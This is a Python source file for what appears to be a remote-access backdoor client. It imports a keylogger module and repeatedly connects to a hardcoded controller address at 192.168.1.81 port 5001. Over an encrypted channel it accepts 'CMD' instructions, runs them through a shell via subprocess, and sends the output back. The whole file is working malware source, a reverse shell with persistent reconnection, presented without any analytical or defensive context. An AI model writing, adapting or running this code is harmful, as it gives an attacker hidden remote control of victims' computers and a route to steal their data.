import socket, time, subprocess, threading,sys
import tools.keylogger as keylogger
import _thread as thread
import settings.keys as keys
import tools.cipher as cipher
import queue

global stop, command_list, send_list
command_list = queue.Queue()
send_list = queue.Queue()
stop = False

def parse_command(sock, cipherClass, command):
    command = command.split(" ", 1)

    if command[0] == "CMD":
        try:
            command_list.put(command[1])
        except:
            send_list.put(cipherClass.encrypt("Error received with the command".encode()))
    else:
        send_list.put(cipherClass.encrypt("Unknown command".encode()))
    return

def send_message(sock):
    global send_list, stop
    while(not(stop)):
        try:
            if not(send_list.empty()):
                message = send_list.get()
                sock.sendall(message)
        except:
            print("ERROR IN SEND_LIST FUNCTION.")
            stop = True
            return

def input_collection(sock,cipherClass):
    global command_list, stop
    while (not(stop)):
        try:
            command = sock.recv(2048)
            command = (cipherClass.decrypt(command)).decode()

            parse_command(sock,cipherClass,command)

        except socket.timeout:
            print("RECEIVED TIMED OUT..")
            pass
        except:
            stop = True
            return False

def execute_commands(sock,cipherClass):
    global command_list, send_list, stop
    while(not(stop)):
        try:
            time.sleep(1)
            command = None
            #Reads the command_list pipe, needs to obtain thread lock
            if (not(command_list.empty())):
                command = command_list.get()
            if(command != None):
                response = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                data = response.stdout.read() + response.stderr.read()
                print("Response was: {}".format(data))
                send_list.put(cipherClass.encrypt(data))
        except:
            print("ERROR IN EXECUTE_COMMANDS FUNCTION")
            stop = True
            return

def start_client(sock, key=keys.CONN_PASSWORD):
    global stop
    IV = None
    while(True):
        try:
            response = sock.recv(2048)
            if response[:3] == 'SRT'.encode():
                IV = response[3:]
                sock.send('ACK'.encode()+IV)
                break
        except socket.timeout:
            print("Socket timed out on handshake..")

    cipherClass = cipher.cipher(key=key,IV=IV,generatedIV=True)

    receiver = threading.Thread(target=input_collection,args=(sock,cipherClass))
    execute = threading.Thread(target=execute_commands,args=(sock,cipherClass))
    sender = threading.Thread(target=send_message,args=(sock,))

    receiver.start()
    sender.start()
    execute.start()

    receiver.join()
    sender.join()
    execute.join()
    print("Error in one of the receiver or sender...")
    stop = False
    time.sleep(1)

HOST = '192.168.1.81'
PORT = 5001

while(True):
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((HOST,PORT))
        print("Connection successful...")
        start_client(sock)
    except:
        time.sleep(3)
        print("Connection Failed")
    finally:
        sock.close()